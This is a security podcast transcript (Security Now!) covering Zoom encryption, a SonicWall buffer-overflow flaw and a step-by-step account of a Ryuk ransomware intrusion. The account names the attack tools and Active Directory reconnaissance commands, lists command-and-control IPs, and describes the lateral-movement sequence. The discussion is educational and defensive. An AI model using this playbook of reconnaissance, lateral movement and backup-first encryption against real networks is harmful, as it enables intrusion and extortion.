STEVE:  So anyway, so this will be available as a technical preview, is now, this week.  To use it, customers must enable E2EE meetings at the account level and opt into E2EE on a per-meeting basis.  I've got a link in the show notes.  Then, and I won't go into the details, but the posting continues with a little Q&A, asking and answering.  But the questions asked are:  How does Zoom provide E2EE encryption?  We already know that.  How do I turn on?  You turn it on.  When would I use it?  When you want to.  Do I have access to all the features of a regular Zoom meeting?  And they answer that question.  Obviously some things break because of this.  We know about that.  Do free Zoom users have access to end-to-end encryption?  Yes. 



LEO:  Oh.



STEVE:  How is this different - oh, yeah, it's free and paid.



LEO:  Nice.  Very good.  Very good.



STEVE:  Yeah, because that's one of the things, that's one of the mistakes they made is they said oh, no, this is only for paid users.  Well, the whole privacy advocate world exploded at that point.  And they said, oh, sorry.  Eric spoke, and he wasn't supposed to.  So anyway, how is this different from Zoom's enhanced GCM encryption?  And, you know, it's better.  How do I verify that my meeting is using end-to-end encryption?  You get a green shield.  How will you continue to provide a safe and secure platform?  We'll keep trying.  What is the rest of the timeline for E2EE?  So, and then there's three other phases and whatever.



So anyway, for what it's worth, they're giving the host of meetings the ability to press a button, generate keys on their client, distribute them using public key crypto to the other clients.  And that's as good as it can be.  We don't know there aren't mistakes.  We have to believe that's what they're doing.  But that is the architecture.  And the architecture is sound.  So I think it's a step forward for Zoom.  And even if they don't get it right the first time, they're going the right direction.  And we know that they've got a good team of actual crypto people looking at the stuff now, and this is the way it should be done.  So props to them, and let's just put Eric on an island, and he can count his money.



LEO:  Yeah.  So it's not that there's something wrong with it.  It's just there's something wrong with him.  And in fact it sounds like they're doing it exactly as you would want them to do it.  So that's nice.



STEVE:  Yes, yes.



LEO:  Very glad to hear that.  That's great.



STEVE:  Yeah.  So Sonic is not having much luck this year.



LEO:  Sonic the Hedgehog?  Sonic the fast food operation?  Sonic the Internet Service Provider?  Which Sonic are we talking about?



STEVE:  That's right, the Internet Service...  



LEO:  The last one.



STEVE:  The firewall provider, the people who make the SonicWall.



LEO:  Oh, that's different, the SonicWall, yeah, that's another - that's different from SonicNet, yes, okay.



STEVE:  Correct.  Oh, yeah, yeah, yeah.  Not the ISP.



LEO:  That's our ISP, so we want - my ears perked up.



STEVE:  Oh, yeah.  Those guys are good.



LEO:  Yeah.



STEVE:  This is their so-called NSA, the Network Security Appliance.



LEO:  Oh, yeah.



STEVE:  If any of our listeners - and apparently there are nearly 800,000 of these.  I was thinking, wow, this is a pretty successful product.



LEO:  Oh, yeah.



STEVE:  Unfortunately, it's in trouble right now.  While we're on the topic of supercritical remote code execution network vulnerabilities with critical ratings above 9 out of 10, we need to make sure that any of our listeners who might be responsible for the operation of one or more of the nearly 800,000 vulnerable SonicWall NSA - that's Network Security Appliance - firewall devices that are currently exposed to the Internet have patched their devices.  Just, I mean, like absolutely you have to patch.



The vulnerability was discovered by the Tripwire VERT security team and was given a CVE-2020-5135.  It impacts the SonicOS, which is the operating system running on the SonicWall Network Security Appliance devices.  As its name implies, the SonicWall NSAs are used as firewalls and as SSL VPN portals to filter control and allow employees to access internal and private networks.  Maybe there are a bunch more of these things that have been deployed recently in order to set up VPNs to allow remote workers to connect back to the enterprise network.



In any event, the Tripwire researchers explained that the SonicOS contains a bug in a component that handles custom protocols.  The vulnerable component is exposed to the WAN, of course, the public Internet, interface; right?  Meaning that any attacker can exploit it remotely.  And moreover, Tripwire teased that exploiting the bug is trivial, even for unskilled attackers.  Oh, boy.  In its simplest form, the bug can cause a denial of service and crash devices.  But as we often see, a remote code execution exploit is probably feasible, they said.



They reported the bug to the SonicWall team, who released patches last Monday, so that's a week and a day ago.  Tripwire announced the vulnerability two days later, last Wednesday, but blessedly declined to provide any further details.  So props to them for not feeling like they had to spill the beans.  Remember, of course, that the Zerologon vulnerability disclosure was delayed six weeks; and, of course, that didn't help in this case.  And it really doesn't help here.  If we know, we know if there are - actually I know the number - 795,357 currently exposed, and at the time of the release vulnerable, SonicWall devices on the public Internet, they're never going to get fixed.  Some of them, yeah, people who have on-the-ball IT, hopefully listeners of the podcast who know about SonicWall, got the announcement, already are updated.  This is old news for them.  Most of these devices will never get fixed.  I mean, that's just the way we know it is now.



So Tripwire said:  "Tripwire VERT has identified a stack-based buffer overflow in SonicWall Network Security Appliance.  The flaw can be triggered by an unauthenticated HTTP request involving a custom protocol handler.  The vulnerability exists within the HTTP/HTTPS service used for product management as well as SSL VPN remote access.  An unskilled attacker" - now, again, skilled to create the exploit, unskilled to use it.  "An unskilled attacker can use this flaw to cause a persistent denial of service condition."  In other words, easy to make a crash.  "Tripwire VERT has also confirmed the ability to divert execution flow through stack corruption, indicating that a remote execution exploit is likely feasible.  This flaw exists pre-authentication and within a component (SSL VPN) which is typically exposed to the public Internet.  As of the date of discovery, a Shodan search for the affected HTTP server banner indicated 795,357 hosts."  Oh, boy.



So this won't be an instant attack.  I'm sure this is why Tripwire are biting their tongue.  Probably once the proofs of concept appear, then they'll do a full disclosure, as would be their due because they did discover this and responsibly report it.  They waited for SonicWall to produce the patch, gave it a couple days, still they'd not said anything further.  But this thing is so juicy, 800,000 servers that are currently exposed, just shy of that, on the Internet.



So as we know, we were just talking about this, it won't be an instant attack.  Some reverse engineering and skilled R&D will be needed.  But now that we have a ransomware ecosystem containing highly motivated penetration hackers who know that they'll be able to sell their intrusions to high-bidding ransomware attackers, this will be far too juicy to be passed up.  I mean, it will be a week or two, and we'll be talking about this.  Yes, an exploit has been developed.  SonicWalls that were not patched are all being taken down.  All of the enterprises behind them are now compromised with ransomware, blah blah blah.  We know how this drama plays out.  We've seen it several times now.



And we also know that while, yes, some SonicWall devices will be updated before the inevitable attacks commence, it's just not going to be the case that, I mean, I would argue less than half of them are probably being actively maintained.  They're deployed.  They've been forgotten.  They're just sitting there, waiting to get exploited.  So such is the world we're in today.



The good news is Microsoft's out-of-cycle patches, which were released last Friday, are kind of yawners.  They're just not that big a deal.  One exists in the HEVC codec, which is not part of Windows 10 by default.  You've got to go get it from the Windows Store in order to have the vulnerability.  And then it has to be leveraged.  A malicious image needs to be created, you have to display the image, and Windows and the Microsoft Store will be updating this HEVC codec anyway.  So that doesn't seem like a big problem.



The other one is interesting.  It was technically a problem with Visual Studio Code that, Leo, you and I were just talking about last week.  Again, not a huge worry.  It allows an attacker to craft a malicious package.json file which, when loaded by Visual Studio Code before the update, could execute malicious code.  So, you know, if you downloaded an open source package that contained a malicious package.json file and ran it on an unpatched version of Visual Studio Code, that would be a way of a bad guy to run code on your machine.  It turns out that these package.json files are regularly used with JavaScript libraries and projects.  As of course we know, JavaScript and the server-side Node.js technology are arguably one of the more popular technologies on the 'Net right now.  So anyway, anyone using Visual Studio Code should update to the current version, and you'll be okay.



This is just sort of a fun tip.  There's been some talk going around about a so-called God Mode in Windows 10.  It's sort of a weird kludge.  You create, I mean, bizarre that Windows 10 does this, but you name a folder one of those wacky global unique IDs, you know, a GUID.  And when you do that, that sort of enables this God Mode, which is a whole bunch of Windows setting things contained in the folder.  Our listeners may have heard that Microsoft is attempting to "simplify," in quotes, and eventually eliminate the traditional Windows Control Panel that I and probably a lot of our listeners appreciate.  It's nice to have all that stuff in one place.  Microsoft, in their infinite wisdom, has decided, oh, that's confusing.  So we're going to just chop it all up and move it around and make it more context aware or something.  No.  Anyway, that's what they're doing.



So I did some digging, and I found a site and an app, neither of which I knew about.  If you google "extended god mode," you will find it.  I've also got it in the show notes.  A guy by the name of Peter Panisz, P-A-N-I-S-Z, has a site, WinTools.info.  I'm very impressed.  I don't know it's taken me so long to stumble over WinTools.info.  But this guy has written a bunch of nice free/donation ware.  For his description of his Extended GodMode, he said:  "The original God Mode contains more than 200 items, depending upon your configuration and operating system version."  He says:  "Extended GodMode" - which is his zero-installation app which you just run - "complements these functions with the Admin Tools and Control Panel elements.  It displays all setting options in a single interface and allows access to them grouped in several ways according to different criteria.  Extended GodMode also includes a powerful search engine.  Individual searches can be saved to create groups of settings.



"Extended GodMode supplements default God Mode with the following features:  a quick search by item name; searches can be saved; you can have managed favorites; display recently used items; most used elements; integration of Control Panel and Admin Tools, which can be disabled; quick access to each setting," blah blah blah.  And support 64-bit Windows 7, 8, not 9, but 10.  He's got a beta for 32-bit versions in the works.  Free of charge; no install required.



On my Windows 7 machine this morning it listed 340 individual problem-solving applets.  Again, you don't have to install it.  You just run the EXE.  It's like 437K or something.  I mean, this guy - and he's got a bunch of other goodies.  So WinTools.info gets my top recommendation.  And there's, like, four pages of freeware stuff that he's got.  So I'll be very surprised if you don't find something tasty and delicious, and thank me.



And in fact this gadget is so nice that it inspired me to create a new permanent thread in my blog at the new GRC forums, forums.grc.com.  I have a "My Favorite Utilities, Apps, and Services."  I think I said goodies.  Utilities, Goodies, and Services or something like that.  I added Sync.com and Syncthing, in addition to this Extended GodMode.  And over time I'll be - oh, and I also put an entry for pfSense and my preferred pfSense hardware little box, which I really like.  So I'll be extending that thread over time.  It's a place for me to sort of keep our listeners apprised of these things that I find and really think are tremendous.  And it was funny, I noted that it was one year ago, Leo, on October 1st of 2019, was "The Joy of Sync" podcast.



LEO:  I remember that, yeah.



STEVE:  Where I talked about both Sync.com and Syncthing.  I'm still completely happy with Sync.com, and I put a link in there in my thread to the referral link, which will give our listeners a free gig in addition to the first five that are free, that you just get for setting up a free account.  And I'm so dependent upon Sync.com.  And of course you and I are both fans of Syncthing. 



LEO:  Love it, yeah.



STEVE:  Which is a non-cloud peer-to-peer synchronizer, which again, another example of just doing everything right.  So, very impressed.



LEO:  Yeah.



STEVE:  One piece of closing-the-loop feedback.  When I was in Twitter this morning looking for a Picture of the Week, which as we know I found, I saw a question from Patrick.  He said:  "Hi, Steve.  Question about ShieldsUp! and port 0."  He said:  "I recently moved, and when scanning with ShieldsUP!, port 0 shows closed instead of stealthed."  So instead of that nice green field, he has a blue box in the first cell, blue for closed, and then of course red is worse.  That's open.  But he says it's showing closed instead of stealthed.



He says:  "I'm using the same ISP and router as before, though I do think the modem is different.  Just curious," he says, "if there is a way to stealth port 0 because, based on the few postings I can find, this is an ISP issue, and I can't do much about it.  Thanks."



So port 0, I don't think we've ever talked about it, or if I ever have, not for many years.  Back when I was implementing ShieldsUP!'s full service port scan, I encountered some reference to port 0 being a bit ping-like in that, unlike the other 1023 service ports, numbered 1 through 1023, port 0 was not assigned to any specific service.  And at the Unix Network API level - of course all this began, you know, the Internet was born on Unix - a specification of a null port when obtaining a network socket is shorthand for asking the OS to pick an unused local port of its choice to use in an outbound connection.  But at the network level, down at the packet bit level, those 16 bits in the packet of a port number can indeed be all zeroes.  So even though it's unused, technically it's legal.



So I figured, with ShieldsUp!, what the heck.  Let's send out a few TCP SYN packets with all their port bits set to zero, and see what happens.  And as Patrick's question notes, sometimes you get back a reply.  Which probably means that it is a means for an attacker to possibly unstealth someone - and I don't know how important that is, but it's kind of fun to be stealth - who might have overlooked port 0.  Which is of course why ShieldsUP! sends out those packets.  So what to do about it?  Well, that depends entirely upon where those SYN packets are being bounced back from.  Since port 0 is not technically valid, any jump along the way between GRC's ShieldsUP! testing server, or actually it's a client, and the user could be intercepting that SYN aimed at port 0 and think, port 0?  What the heck.  Let's just say no.



Of course saying no is not stealth.  Saying nothing is stealth.  But my point is those port 0 SYN packets might not even be making it all the way to the user.  Your ISP certainly has no problem blocking port 25, ports 137 through 139, and 445, which of course were famously Windows disasters.  So they might also be returned, those packets could be returned with a closed status for port 0.  He did mention that he was using the same ISP.  But if he moved, he might actually be coming to the ISP through a different route.  So it still could be the ISP.



What you can do to stealth something which is not stealthed by default is set up a static port forward to nowhere.  That is, most routers allow you to set up a DMZ.  And if you can DMZ that port, port 0, send it to a nonexistent IP on your LAN.  And what'll happen is, rather than responding with closed on port 0, if your router does, it'll forward that into nowhere, and no response will happen.  I'm kind of skeptical that it's the router because it would seem odd to me for the router to say closed on port 0, but not to respond to any other ports.  But again, you just have to experiment a bit.  But if you are able to forward port 0 to nowhere, then that would be a way of doing so.



LEO:  Ryuk, Ryuk, Ryuk.  It's time to talk about ransomware.



STEVE:  However you pronounce it, it is spelled R-Y-U-K.



LEO:  Well, it's a Japanese word, so it's not even spelled R-Y-U-K.  That's the Anglicization of it.



STEVE:  Oh, okay.  Well, that's how I'm spelling it.



LEO:  Okay.



STEVE:  I do know you don't want it.



LEO:  You don't want it.  That's true.  I'll grant you that.



STEVE:  You do not want that in your network.



LEO:  No.



STEVE:  The DFIR Report site specializes in forensic analysis of ransomware, and also some other malware attacks, but predominantly ransomware.  Two days ago, on Sunday, the DFIR Report site posted a fascinating step-by-step forensic walkthrough of - technically it was a five-hour Ryuk attack.  So that would be five hours, 300 minutes, from the time that a phishing link was first clicked on to provide a callback to the malware operators who were initially, before that, completely unaware of the resources they had just been provided access to.  Now, as we'll see, I think they waited 2.5 hours.  My theory is, based on the time of day that that link was clicked, they waited 2.5 hours for all the employees to drain out of the organization and go home so that they could operate more unseen, and they weren't in a big hurry.



But anyway, I'll explain how all this thing unfolded along the way.  In order for this report's blow-by-blow walkthrough to make sense, we first need to add details of three commonly used malware packages to our knowledge base.  The first malware package is known as BazarLoader, B-A-Z-A-R Loader.  It's the tip of the spear, the first thing that gets loaded and runs to provide the foothold that an attacker needs for then further penetration.  CyberReason.com has been watching BazarLoader since its first sighting this past April.  There's a quick summary of what they know about it, and I'll note that this research is about BazarLoader in general, not specifically about its use in this particular malware attack.



But CyberReason said:  "Bazar can be used to deploy additional malware, ransomware, and ultimately steal sensitive data from organizations."  Basically it's an easy entry backdoor.  They said:  "Bazar malware infections are specifically targeted at professional services, healthcare, manufacturing, IT, logistics, and travel companies across the U.S. and Europe."  And of course that's sort of specific to their particular view of it.  Now it's being used as a general purpose spear tip.  They said:  "Bazar leverages the Twilio SendGrid email platform and" - and this is important - "validly signed loader files to evade traditional security software in conjunction with a fileless backdoor to establish persistence.



"Over the course of their investigation," they said, "it is evident that Bazar is under active development.  Recently, the active campaigns disappeared, to later reappear with a new version, suggesting that the group is under a development cycle."  They said:  "This stealthy loader evades detection by abusing the trust of certificate authorities, much like previous TrickBot loaders.  This loader uses EmerDNS with the .bazar top-level domain," thus the name, .bazar, "for command and control, and is heavily obfuscated."



Now, okay.  As an aside, what is EmerDNS?  Get this.  It's a completely decentralized blockchain-based DNS alternative that we've never talked about.  What's blockchain-based DNS?  Well, quoting from the EmerDNS site, they said:  "Are you afraid your website could be suspended by authorities?  With the screws tightening around the world, your fears might well be justified.  EmerDNS is safe from any kind of censorship.  No other user can modify your record.  Only the record creator can manipulate its content."  So, uh-huh.  What could be better for malware command-and-control servers than to rely upon a decentralized blockchain-based DNS that cannot be sinkholed by authorities?  Yeah.  Unfortunately, once again, sort of something, I guess I would put that in the gray, bordering on darker than gray, side of the law.



Anyway, Bazar also uses anti-analysis techniques to thwart automated and manual analysis, and loads the encrypted backdoor solely in RAM.  So that's one piece of what we'll be talking about is this BazarLoader.  It's now part of the toolkit of whoever was using Ryuk in this particular attack.  It is signed validly, runs in RAM.  It avoids and evades AV and opens a connection using this Bazar blockchain-based DNS, gets the IP of where the command-and-control server is currently located, and phones home. 



Okay.  Next is Cobalt Strike.  What's interesting is that Cobalt Strike is not hiding.  It lives at CobaltStrike.com, where it is being offered for sale for supposedly legitimate Red Team penetration testing purposes.  Uh-huh.  The Cobalt Strike site says:  "Cobalt Strike is software for Adversary Simulations and Red Team Operations.  Adversary Simulations and Red Team Operations are security assessments that replicate the tactics and techniques of an advanced adversary in a network."  And of course, if this thing is given to an advanced adversary, then it's not replicating them.  It's actually perpetuating them.  



Anyway, they said:  "While penetration tests focus on unpatched vulnerabilities and misconfigurations, these assessments benefit security operations and incident response.  Cobalt Strike gives you a post-exploitation agent and covert channels to emulate a quiet long-term embedded actor in your customer's network."



LEO:  Yeah.  Yeah, baby.



STEVE:  Okay, now, you know, if this was a legitimate Red Team, they really wouldn't need that; right?



LEO:  No.



STEVE:  So it's like, okay.  They said:  "Malleable C2 (Command and Control) lets you change your network indicators to look like different malware each time."  How convenient.  "These tools complement Cobalt Strike's solid social engineering process, its robust collaboration capability, and unique reports designed to aid blue team training.  To learn more about Cobalt Strike, watch the 'Red Team Operations with Cobalt Strike' course."  Oh, and get this.  "And how much does Cobalt Strike cost?  New Cobalt Strike licenses cost $3,500 per user for a one-year license.  License renewals cost $2,500 per user per year."



LEO:  Just think of all the money you're going to make.



STEVE:  That's right.  Now it's worth noting that despite the hefty price tag, Cobalt Strike has a trial version that's entirely useful and functional and that was in fact used in unlicensed trial mode for this successful Ryuk attack.



LEO:  Oh.  Why pay for something when you can get it for free?  There's no honor among thieves today.  That's terrible.



STEVE:  No, none.



LEO:  Terrible.



STEVE:  Now, Malpedia describes Cobalt Strike a little more practically.  Yes, Leo, there is something called Malpedia.



LEO:  There is a Malpedia, okay.



STEVE:  There is a Malpedia.



LEO:  Oh, yeah.



STEVE:  They said:  "Cobalt Strike is a paid penetration testing product that allows an attacker to deploy an agent named Beacon" - and that's important, we'll be talking about that, so that's why I wanted to bring this up - "Beacon on the victim machine.  Beacon includes a wealth of functionality to the attacker, including but not limited to command execution, key logging, file transfer, SOCKS proxying, privilege escalation, Mimikatz functionality, port scanning, and lateral movement.  Beacon is in memory, fileless, in that it consists of stageless or multistage shellcode that, once loaded by exploiting a vulnerability or executing a shellcode loader, will reflectively load itself into memory of a process without touching the disk.  It supports command-and-control and staging over HTTP, HTTPS, DNS, SMB named pipes, as well as forward and reverse TCP.  Beacons can be daisy-chained.  Cobalt Strike comes with a toolkit for developing shellcode loaders, called Artifact Kit.  The Beacon implant has become popular amongst targeted attackers" - uh-huh - "and criminal users as it is well written, stable, and highly customizable."



Okay.  The third and final tool we need to note, for reasons that will soon become clear, is a 100% legitimate bit of freeware known as AdFind, A-D-F-I-N-D, as in Active Directory Finder.  AdFind is offered by a freeware developer located at www.joeware.net, J-O-E-W-A-R-E.  And everybody, I must say that I was somewhat delighted to encounter a website that's still on the 'Net and being actively maintained which makes GRC.com look futuristic by comparison.



LEO:  Oh, I've got to see this.



STEVE:  Oh, Leo.  It is really something, www.joeware.net.



LEO:  Guess Joe isn't all that up on the latest web technologies.



STEVE:  Actually, this has to be on purpose.  Because this thing, AdFind, was written in C++ and compiled with - I know.



LEO:  No, this is ironically tacky.  Okay.  Never stop exploring.



STEVE:  That's right.



LEO:  Wow.



STEVE:  And then we come to an advanced page where we have something - I don't know how he avoided the spinning mailbox.  That's probably somewhere on the site.  I know.



LEO:  This is very hackery, yeah.  So do you think this is the person who created the tools?  Or this is just somebody...



STEVE:  Oh, no, no.  This is definitely...



LEO:  This is Joe.



STEVE:  Joe is a legitimate - he has a very Active Directory-focused approach.  And Active Directory, I mean, it just - it's a nice tool.  It's not malicious at all.  AdFind accepts a bunch of command line commands.  For example, adfind.exe -f and then in quotes "objectcategory=person."  And that dumps all the people objects that an Active Directory server knows of.  Or you can say adfind.exe -f and then in quotes "objectcategory=computer," and it will find all the computers in the domain and tell you about them.  Or "trustdump," and it will dump all of the trust objects in Active Directory.  Or "subnet," and it will dump all of the subnets that that Active Directory server knows about.  So it is a very handy tool for someone who needs something small and lightweight that they want to use to, starting from zero, to find out where they are after a penetration.



Okay.  So we know about BazarLoader.  We know about Cobalt Strike.  And we know about its Beacon and this freeware AdList utility.  So the attack began with Bazar being introduced to the victim's environment through a phishing email with a link to what looked like a PDF located in Google Docs.  Of course it was trading on the targets, so whoever it was who got the phishing email, their knowledge and presumed trust of Google.com stuff.  So the link was to a file containing a double extension EmploymentRecord.pdf.exe.  And of course well-known extensions are often suppressed.  So what the user saw was EmploymentRecord.pdf.  And they didn't stop to wonder why that filename extension was not suppressed.  And of course it also confirmed that, oh, look, it's a PDF.  Those are safe to open.



Well, of course it wasn't.  It was a .pdf.exe, which was actually an instance of Bazar.  Signed, properly signed, trusted, obfuscated, so basically self-encrypted per instance so that AV wouldn't know what it was.  It's got a signature.  Okay, let's run it.  The user wants to run it.  Thus the BazarLoader achieved its first penetration and foothold on that user's machine.  It immediately spawned a new instance of Windows Explorer process, into which it injected itself into that process's memory for continued stealthful execution, and then terminated its spoofed PDF executable.  It just abandoned it.  Now it's living in an instance of explorer.exe, known and trusted and perfect except, by doing a RAM injection, it's not part of that executable.  It's just living in that executable's process space.



It then reached out to its designated command-and-control server at 3.137.182.114, establishing an encrypted TLS tunnel to that IP's port 443.  So it just looks like any standard, okay, outbound HTTP/TLS connection, except it's not.  It's this instance running in RAM of explorer.exe that has now made contact to the attackers.



Now, since you never know when a phishing attack is going to be successful, from the attacker's viewpoint, they're not always paying attention.  In this instance, 2.5 hours passed before they first responded to that BazarLoader's instance incoming call.  Whereupon its human controllers, wherever they were located in the world, took over.  However, since that initial penetration occurred, that is, the user clicking on the link in email, occurred at 5:01 p.m. local time, it's also very possible that the attackers waited, somewhat impatiently, for 2.5 hours to pass so that that company, if it was closing down at 5:00, all the employees would have left for the day, turned the lights off, locked the doors, giving them a greater opportunity to do what they want to do unnoticed.



LEO:  Was it a 5:01 on a Friday?  Because that's often the case.  They do it on the weekend; right?



STEVE:  Ah, I didn't catch the day of the week.



LEO:  Because they want to get the most amount of time to play before they come back to work.



STEVE:  Well, in this instance they do know that the employee clicked the link on their workstation at 5:01.  So it would...



LEO:  That's interesting.  He was on his way out.



STEVE:  It was probably not a Saturday or - yeah.



LEO:  Click here before you go home for the weekend.



STEVE:  Yeah, exactly.  So in this instance the machine that that user was using was a domain user with no additional privileges.  But BazarLoader used the built-in Windows utility nltest.  And I looked.  I've never had the occasion to type it, but I opened a command prompt and, sure enough, my Windows 7 machine has nltest, "nl" as in Netlogon.  And among other things, this is a Windows utility, ships with Windows.  Nltest will obtain a list of the network's domain controllers to provide an initial mapping of the domain.



So by using something that that workstation had, although there were no privileges, you don't need any in order to just make that query using the nltest command line executable.  And that allowed the attackers to get the location, names and location of the domain controllers.  Now we're in a world where we have the Zerologon vulnerability, which is now a reality and which is, as I said last week, because it is a protocol-level reality, it is going to be a long time before all those domain controllers get themselves updated.



In this instance, the attackers wasted no time.  They were on a machine with no privilege, so they immediately reached out and used Zerologon exploit to reset the password of that network's primary domain controller, which nltest had identified for them.  They then began moving laterally from machine to machine using initially SMB file transfers to duplicate themselves, and WMI to remotely execute the newly copied instance on the other machine.  Once they got onto that primary domain controller, they executed this Cobalt Strike Beacon.  The Cobalt Strike Beacon comes in both a portable executable and a DLL version.  And what these guys were using was they would copy the DLL and then execute it using the rundll32 command, which is also part of all Windows instances forever.



So once on the primary domain controller, the attacker again moved laterally onto the secondary domain controller to establish a backup beachhead.  And it is believed that maybe something didn't work the way they were expecting on the primary domain controller because they end up going back to it, as we'll see in a second, through a different channel.  But in any event, again, they move laterally to the secondary domain controller to establish a backup.  That instance of the BazarLoader, that's what I was trying to remember, that instance of BazarLoader reached out and connected to a command-and-control server located at 88.119.171.94, also over TLS port 443, looking like anybody's HTTPS query.  And a second Beacon DLL was dropped and executed on that machine using rundll32.  It, once it came out, reached out to 5.2.64.174, also to port 443.



So at this point the attacker performed additional domain discovery using just some standard net commands and the PowerShell Active Directory module.  They then employed the default named pipe privilege escalation module on the server and used RDP to connect back from the secondary domain controller to the first domain controller using the built-in admin account.  And again, as I said, the guys who were watching this believe that that was done because something may have gone wrong with their initial intrusion onto the primary domain controller.



So after moving laterally to the secondary domain controller, they then returned to the primary over RDP, which was guaranteed to work robustly because of course Microsoft provided it to everybody in order to allow these things to be done.  So once on the main domain controller, another Cobalt Strike Beacon DLL was dropped there, and it was executed.  It also reached out and connected to the same IP as the first Beacon, that's 5.2.64.174 over TLS 443, connecting to the same command-and-control server.



Okay.  So now we have BazarLoader and Beacons loaded and running all in RAM on both the primary and the secondary domain controller.  So now Joe's well-meaning AdFind (Active Directory Find) utility was used to perform deeper domain reconnaissance to list all the people and all their machines, all the subnets and all the trust relationships.  So that took 90 minutes from the time they became active.  After waiting 2.5 hours, another hour and a half was used to get all of that set up.  Moving throughout the network, they were ready to launch their multi-tiered attack.  They had an inventory of all of the machines that they were going to blast with the Ryuk ransomware.



They first RDP'd into the network's backup server, which they had identified thanks to AdFind, which had been located during their earlier reconnaissance.  Of course, a commonsense tactic is to always first encrypt an organization's backup servers to prevent easy recovery of all of the other machines.  So it's backup servers targeted first for Ryuk execution, followed by the organization's non-backup server servers, and then all of the workstations.  After 2.5 hours of active work, and Ryuk now deployed and running on every machine except the primary domain controller, which was at that point hosting the attacker, the attackers concluded their work by also executing Ryuk on the primary domain controller, thus encrypting every machine within the organization.



After Ryuk finishes, it displays the ransom notice and wipes itself from RAM to remove all remnants and record of the attack.  So from the time some user unwittingly clicked a link in phishing email, nothing happened for 2.5 hours.  Then, 2.5 hours later, every machine in the network was encrypted and a ransom note left on the machines.  And that's the way one of these things happens.



LEO:  Oh, you're not going to tell us how they remediated it or anything?  You're just going to let it hang there?



STEVE:  That's the end of the story, children.  Another company hosed, completely hosed, by Ryuk.



LEO:  But, but, but what happened?



STEVE:  Went right past AV.  It was trusted because it was signed.  It made connections back to command-and-control servers that are using a bizarre blockchain DNS that cannot be taken down by the authorities.  That's the world we're in now.  And now 800,000 new SonicWall VPN firewalls are now open to an exploit, and you have to know that bad guys are working feverishly to leverage that new patched vulnerability on all the firewalls that won't get patched as a way in to do exactly what we've just described.



LEO:  Wow.  Wowie, wowie, wowie.  



STEVE:  It is a nightmare.



LEO:  Well, yeah.  It's a cautionary tale.



STEVE:  And on that happy note...



LEO:  Yeah.  But it's fascinating to hear how it happens.  Not surprising; but, yeah, fascinating.  That's Steve Gibson, man.  This guy, he's our security guru, our hero.  Every week we get together and talk about the latest security news.  Lots of information.  You'll find Steve at his website, GRC.com.  That's where SpinRite lives, the world's finest hard drive recovery and maintenance utility.  That's his bread and butter.  But there's lots of free stuff, like the ShieldsUP! we were talking about earlier.  Find out if your port 0 is stealthed.  Can you stealth port 0?



STEVE:  Yeah. 



LEO:  How would you stealth it?



STEVE:  You just let it go.  You just let anything coming in go, just like nowhere.  No reply.



LEO:  Right.  And most routers you can say, oh, just stealth it.  I guess.  I'm all green.



STEVE:  Yes, exactly.  You're all green, so your router's doing the right thing, baby.



LEO:  It's a Ubiquiti, baby.  Of course it is.  Steve has lots of information about all sorts of great interesting subjects, including things like Vitamin D, at GRC.com.  He also has this show.  He has a 16Kb version for people who like to pretend they're living in the 18th Century.  He has text-only versions.  Actually, that's useful because you can read along as you listen, and it really helps with the understanding, I find.  He also has 64Kb audio, all at GRC.com.



I have at TWiT.tv/sn, 64Kb audio and video, as well, so you can download it there.  If you want to watch us do the show live, it's usually around 1:30 to 2:00 p.m. Pacific.  That's 4:30 to 5:00 p.m. Eastern time, 20:30 UTC.  The stream is at TWiT.tv/live.  There's audio and video streams.  You can pick a stream and listen.  If you're doing that, chat with us at irc.twit.tv, irc.twit.tv.  We have an asynchronous forum, just like Steve does.  Steve has great forums.  We have them, too, at www.twit.community.  You're more than welcome there.



And of course you can always get on-demand versions of the show at TWiT.tv/sn, as I mentioned.  On YouTube there's a whole Security Now! YouTube channel.  Best thing to do, though, find yourself a podcast application.  Subscribe.  I'm sure you'll find it's everywhere.  And once you do, you get every episode the minute it comes out.  Thank you, Mr. G.  Have a wonderful week.  I'll see you next time on Security Now!.



STEVE:  Right-o.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#790

DATE:		October 27, 2020

TITLE:		The 25 Most Attacked Vulnerabilities

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-790.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine a recently patched zero-day in Chrome and a nice new feature in that browser.  We look at the site isolation coming soon to Firefox, and Microsoft's announcement of Edge for Linux.  We have some movement in the further deprecation of Internet Explorer, and a potentially massive SQL injection attack that was recently dodged by more than one million WordPress sites, despite the fact that some admins complained.  Then we have a bit of miscellany, closing-the-loop feedback, and an update on my work on SpinRite.  We end by looking at the NSA's recently published list of the top 25 network vulnerabilities being used by malicious Chinese state actors to attack U.S. assets.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  This week on Security Now!, a zero-day in Chrome.  Better get your patch running.  Firefox and some new security measures to sandbox, to isolate processes.  We'll talk about the top 25 Chinese attacks on the United States according to the NSA.  Another flaw in WordPress you'll want to patch immediately, if it hasn't already been patched for you.  And a whole lot more.  It's coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 790, recorded Tuesday, October 27th, 2020:  The Top 25 vulnerabilities.



It's time for Security Now!, the show where we cover your privacy, your security, your safety online with this guy right here, Steve Gibson of the Gibson Research Corporation.  Hello, Steve.



STEVE GIBSON:  Yo, Leo.  Great to back with you again for Episode 790, our last episode of October 2020.  And those who are watching the video will notice that I'm coming to everyone from our alternate location.  I was working on the podcast, like a couple hours to go, and all of my connectivity disappeared.  Later, when I got over here, I logged onto Cox, which is my cable modem provider, and I got a kick out of their notice.



They said:  "We've noticed a temporary outage related to your Internet, TV, and phone service."  So first of all, they noticed a temporary outage?  They noticed an outage which they hope is temporary.  And of course I'm hoping that, too.  And they said the estimated time to repair, 4:13 p.m.  So of course we record this between 1:30 and 2:00 typically.  We're pretty much wrapping up around that time.  So I thought, I think maybe I need to set up the alternate location.  So I did so.



LEO:  That's twice now in like a month or something; right?



STEVE:  Yeah, yeah.  And of course, thanks to the nature of broadband in the U.S., I have no alternative provider.  I mean, they're nominally pretty good.  But again, as you said, Leo, it's getting to be like, okay, wait a minute.  On the other hand, we did go for 15 years without any trouble, although remember the old days with two T1s?  



LEO:  Oh, yeah, yeah, yeah.



STEVE:  Those were the days.



